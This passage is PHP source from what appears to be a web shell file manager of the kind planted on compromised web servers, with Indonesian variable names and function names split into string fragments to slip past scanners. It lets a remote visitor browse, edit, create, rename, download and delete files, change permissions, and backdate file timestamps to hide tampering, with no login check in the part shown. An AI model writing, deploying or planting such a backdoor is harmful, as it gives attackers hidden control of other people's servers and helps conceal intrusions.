              $ceen($_POST['loknya'], $namabaru) === true ? alertSuccess("Rename Success!") : alertError("Rename Failed!");
              $showName = $_POST['newname'];
          } else { $showName = $bsn($_POST['loknya']); }
          $lbl = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
          echo '<div class="card max-w-md"><p class="text-xs text-dim mb-3">' . $lbl . ': <span class="text-accent font-mono">' . $hsc($_POST['loknya']) . '</span></p>';
          echo '<form method="post" class="flex gap-2">
                  <input name="newname" type="text" class="field flex-1" value="' . $hsc($showName) . '">
                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
                  <input type="hidden" name="pilih"  value="ubahnama">
                  <input type="hidden" name="type"   value="' . $_POST['ty'.'pe'] . '">
                  <button type="submit" name="gantin" class="submit-btn"><i class="fa-solid fa-check mr-1"></i>Rename</button>
                </form></div>';
          echo '</div>';

      } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-pen-to-square"></i> Edit File</h2>';
          if (isset($_POST['gasedit'])) {
              $edit = @$fpt($_POST['loknya'], $_POST['src']);
              $fgt($_POST['loknya']) == $_POST['src'] ? alertSuccess("Edit Success!") : alertError("Edit Failed!");
          }
          echo '<p class="text-xs text-dim mb-2 font-mono">' . $hsc($_POST['loknya']) . '</p>';
          echo '<form method="post" class="space-y-2">
                  <textarea name="src" rows="28" class="field w-full font-mono text-xs leading-relaxed">'
             . $hsc($fgt($_POST['loknya'])) . '</textarea>
                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
                  <input type="hidden" name="pilih"  value="ed'.'it">
                  <button type="submit" name="gasedit" class="submit-btn"><i class="fa-solid fa-floppy-disk mr-1"></i>Save File</button>
                </form>';
          echo '</div>';

      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-calendar-days"></i> Change Date</h2>';
          if (isset($_POST['tanggale'])) {
              $stt = "st"."rtot"."ime"; $tch2 = "t"."ou"."ch";
              $tanggale = $stt($_POST['tanggal']);
              $tch2($_POST['loknya'], $tanggale) === true ? alertSuccess("Change Date Success!") : alertError("Failed to Change Date!");
          }
          $det2 = "da"."te"; $ftm2 = "fi"."le"."mti"."me";
          $dateVal = $det2("d F Y H:i:s", $ftm2($_POST['loknya']));
          $lbl = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
          echo '<div class="card max-w-md"><p class="text-xs text-dim mb-3">' . $lbl . ': <span class="text-accent font-mono">' . $hsc($_POST['loknya']) . '</span></p>';
          echo '<form method="post" class="flex gap-2">
                  <input name="tanggal" type="text" class="field flex-1" value="' . $hsc($dateVal) . '">
                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
                  <input type="hidden" name="pilih"  value="ubahtanggal">
                  <input type="hidden" name="type"   value="' . $_POST['ty'.'pe'] . '">
                  <button type="submit" name="tanggale" class="submit-btn"><i class="fa-solid fa-check mr-1"></i>Apply</button>
                </form></div>';
          echo '</div>';

      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
          $dunlute = $_POST['loknya'];
          if ($fxt($dunlute) && isset($dunlute)) {
              if ($ird($dunlute)) dunlut($dunlute);
              elseif ($idr($fl)) { echo '<div class="p-5">'; alertError("That is a Directory, not a File."); echo '</div>'; }
              else { echo '<div class="p-5">'; alertError("File is not Readable!"); echo '</div>'; }
          } else { echo '<div class="p-5">'; alertError("File Not Found!"); echo '</div>'; }

      } elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fo"."ld"."er") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-folder-plus"></i> Create Folder</h2>';
          if ($isw("./") || $ird("./")) {
              $loke = $_POST['loknya'];
              if (isset($_POST['buatfol'.'der'])) {
                  $buatf = $mkd($loke . "/" . $_POST['fo'.'lde'.'rba'.'ru']);
                  $buatf ? alertSuccess("Folder <b>" . $hsc($_POST['fo'.'lde'.'rba'.'ru']) . "</b> created!") : alertError("Failed to create folder!");
              }
              echo '<div class="card max-w-md"><form method="post" class="flex gap-2">
                      <input type="text" name="fo'.'lde'.'rba'.'ru" class="field flex-1" placeholder="folder-name">
                      <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
                      <input type="hidden" name="pilih"  value="Fo'.'lde'.'r">
                      <button type="submit" name="buatFo'.'lde'.'r" class="submit-btn"><i class="fa-solid fa-folder-plus mr-1"></i>Create</button>
                    </form></div>';
          }
          echo '</div>';

      } elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-file-circle-plus"></i> Create File</h2>';
          if ($isw("./") || $isr("./")) {
              $loke = $_POST['lok'.'nya'];
              if (isset($_POST['buatfi'.'le'])) {
                  $buatf = $fpt($loke . "/" . $_POST['fi'.'lebaru'], "");
                  $fxt($loke . "/" . $_POST['fi'.'lebaru']) ? alertSuccess("File <b>" . $hsc($_POST['fi'.'lebaru']) . "</b> created!") : alertError("Failed to create file!");
              }
              echo '<div class="card max-w-md"><form method="post" class="flex gap-2">
                      <input type="text" name="fi'.'lebaru" class="field flex-1" placeholder="filename.txt">
                      <input type="hidden" name="loknya" value="' . $_POST['lok'.'nya'] . '">
                      <input type="hidden" name="pilih"  value="fi'.'le">
                      <button type="submit" name="buatfi'.'le" class="submit-btn"><i class="fa-solid fa-file-circle-plus mr-1"></i>Create</button>
                    </form></div>';
          }
          echo '</div>';

      } else {

      /* ================================================================
       *  FILE EXPLORER TABLE (default view)
       * ================================================================ */
      ?>
      <div class="flex-1 overflow-y-auto">
        <table id="file-table" class="w-full border-collapse">
          <thead class="sticky top-0 bg-surface z-10">
            <tr>
              <th class="text-left">Name</th>
              <th class="text-center">Size</th>
              <th class="text-center">Modified</th>
              <th class="text-center">Owner / Group</th>
              <th class="text-center">Perms</th>
              <th class="text-center">Actions</th>
            </tr>
          </thead>
          <tbody>

            <!-- Parent dir row -->
            <?php
            $euybrekw = $srl($bsn($lokasi), "", $lokasi);
            $euybrekw = $srl("//", "/", $euybrekw);
            $permVal  = statusnya($euybrekw);
            $permCls  = $isw($euybrekw) ? 'perm-write' : (!$isr($euybrekw) ? 'perm-noread' : 'perm-normal');
            ?>
            <tr class="file-row">
              <td>
                <div class="filename-cell">
                  <i class="fa-solid fa-folder-open ico-back"></i>
                  <a href="?loknya=<?php echo $euybrekw; ?>">..</a>
                  <span class="text-dim text-xs">(parent)</span>
                </div>
              </td>
              <td class="text-center text-dim text-xs">—</td>
              <td class="text-center text-dim text-xs"><?php echo fdt($euybrekw); ?></td>
              <td class="text-center text-dim text-xs"><?php echo gor($euybrekw); ?> / <?php echo ggr($euybrekw); ?></td>
              <td class="text-center"><span class="<?php echo $permCls; ?> text-xs font-mono"><?php echo $permVal; ?></span></td>
              <td class="text-center">
                <div class="flex items-center justify-center gap-1">
                  <form method="POST" action="?pilihan&loknya=<?php echo $lokasi; ?>">
                    <input type="hidden" name="type"   value="dir">
                    <input type="hidden" name="loknya" value="<?php echo $lokasi; ?>/">
                    <button type="submit" name="pilih" value="folder" class="icon-btn safe" title="New Folder">
                      <i class="fa-solid fa-folder-plus fa-xs"></i>
                    </button>
                    <button type="submit" name="pilih" value="file" class="icon-btn safe" title="New File">
                      <i class="fa-solid fa-file-circle-plus fa-xs"></i>
                    </button>
                  </form>
                </div>
              </td>
            </tr>

            <!-- Directories -->
            <?php foreach ($lokasinya as $ppkcina):
                $euybre = $lokasi . "/" . $ppkcina;
                $euybre = $srl("//", "/", $euybre);
                if (!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
                $permVal = statusnya($euybre);
                $permCls = $isw($euybre) ? 'perm-write' : (!$isr($euybre) ? 'perm-noread' : 'perm-normal');
            ?>
            <tr class="file-row">
              <td>
                <div class="filename-cell">
                  <i class="fa-solid fa-folder ico-folder"></i>
                  <a href="?loknya=<?php echo $euybre; ?>"><?php echo $ppkcina; ?></a>
                </div>
              </td>
              <td class="text-center text-dim text-xs">—</td>
              <td class="text-center text-dim text-xs"><?php echo fdt($euybre); ?></td>
              <td class="text-center text-dim text-xs"><?php echo gor($euybre); ?> / <?php echo ggr($euybre); ?></td>
              <td class="text-center"><span class="<?php echo $permCls; ?> text-xs font-mono"><?php echo $permVal; ?></span></td>
              <td class="text-center">
                <div class="flex items-center justify-center gap-1">
                  <form method="POST" action="?pilihan&loknya=<?php echo $lokasi; ?>">
                    <input type="hidden" name="type"   value="dir">
                    <input type="hidden" name="name"   value="<?php echo $ppkcina; ?>">
                    <input type="hidden" name="loknya" value="<?php echo $lokasi . "/" . $ppkcina; ?>">
                    <button type="submit" name="pilih" value="ubahnama"    class="icon-btn" title="Rename"><i class="fa-solid fa-pen fa-xs"></i></button>
                    <button type="submit" name="pilih" value="ubahtanggal" class="icon-btn" title="Change Date"><i class="fa-solid fa-calendar-days fa-xs"></i></button>
                    <button type="submit" name="pilih" value="ubahmod"     class="icon-btn" title="Permissions"><i class="fa-solid fa-key fa-xs"></i></button>
                    <button type="submit" name="pilih" value="hapus"       class="icon-btn danger" title="Delete"><i class="fa-solid fa-trash fa-xs"></i></button>
                  </form>
                </div>
              </td>
            </tr>
            <?php endforeach; ?>

            <!-- Files separator -->
            <tr class="dir-divider">
              <td colspan="6"><i class="fa-solid fa-file fa-xs mr-2"></i>Files</td>
            </tr>

            <!-- Files -->
            <?php
            $skd = "10"."24";
            foreach ($lokasinya as $mekicina):
                $euybray = $lokasi . "/" . $mekicina;
                if (!$ifi("$lokasi/$mekicina")) continue;
                $size = $fsz("$lokasi/$mekicina") / $skd;
                $size = $rd($size, 3);
                $size = ($size >= $skd) ? $rd($size / $skd, 2) . ' MB' : $size . ' KB';
                $permVal = statusnya($euybray);
                $permCls = $isw($euybray) ? 'perm-write' : (!$isr($euybray) ? 'perm-noread' : 'perm-normal');
            ?>
            <tr class="file-row">
              <td>
                <div class="filename-cell">
                  <?php echo cfn($euybray); ?>
                  <a href="?lokasie=<?php echo "$lokasi/$mekicina"; ?>&loknya=<?php echo $lokasi; ?>">
                    <?php echo $mekicina; ?>
                  </a>
                </div>
              </td>
              <td class="text-center text-dim text-xs"><?php echo $size; ?></td>
              <td class="text-center text-dim text-xs"><?php echo fdt($euybray); ?></td>
              <td class="text-center text-dim text-xs"><?php echo gor($euybray); ?> / <?php echo ggr($euybray); ?></td>
              <td class="text-center"><span class="<?php echo $permCls; ?> text-xs font-mono"><?php echo $permVal; ?></span></td>
              <td class="text-center">
                <div class="flex items-center justify-center gap-1">
                  <form method="post" action="?pilihan&loknya=<?php echo $lokasi; ?>">
                    <input type="hidden" name="type"   value="file">
                    <input type="hidden" name="name"   value="<?php echo $mekicina; ?>">
                    <input type="hidden" name="loknya" value="<?php echo "$lokasi/$mekicina"; ?>">
                    <button type="submit" name="pilih" value="edit"       class="icon-btn safe"   title="Edit"><i class="fa-solid fa-pen-to-square fa-xs"></i></button>
                    <button type="submit" name="pilih" value="ubahnama"   class="icon-btn"        title="Rename"><i class="fa-solid fa-pen fa-xs"></i></button>
                    <button type="submit" name="pilih" value="ubahtanggal"class="icon-btn"        title="Change Date"><i class="fa-solid fa-calendar-days fa-xs"></i></button>
                    <button type="submit" name="pilih" value="ubahmod"    class="icon-btn"        title="Permissions"><i class="fa-solid fa-key fa-xs"></i></button>
                    <button type="submit" name="pilih" value="dunlut"     class="icon-btn safe"   title="Download"><i class="fa-solid fa-download fa-xs"></i></button>
                    <button type="submit" name="pilih" value="hapus"      class="icon-btn danger" title="Delete"><i class="fa-solid fa-trash fa-xs"></i></button>
                  </form>
                </div>
              </td>
            </tr>
            <?php endforeach; ?>

          </tbody>
        </table>
      </div>
      <?php } /* end default view */ ?>

    </main>
  </div><!-- end main area -->
</div><!-- end flex wrapper -->

<script>
function toggleTheme() {
    var html  = document.documentElement;
    var icon  = document.getElementById('theme-icon');
    var label = document.getElementById('theme-label');
    var isLight = html.classList.toggle('light');

    if (isLight) {
        icon.className  = 'fa-solid fa-sun';
        icon.style.color = 'var(--c-accent)';
        label.textContent = 'LIGHT';
        localStorage.setItem('bl-theme', 'light');
    } else {
        icon.className  = 'fa-solid fa-moon';
        icon.style.color = 'var(--c-accent)';
        label.textContent = 'DARK';
        localStorage.setItem('bl-theme', 'dark');
    }
}

// Sync button state on load
(function() {
    var t = localStorage.getItem('bl-theme') || 'dark';
    var icon  = document.getElementById('theme-icon');
    var label = document.getElementById('theme-label');
    if (!icon || !label) return;
    if (t === 'light') {
        icon.className = 'fa-solid fa-sun';
        label.textContent = 'LIGHT';
    } else {
        icon.className = 'fa-solid fa-moon';
        label.textContent = 'DARK';
    }
})();
</script>
</body>
</html>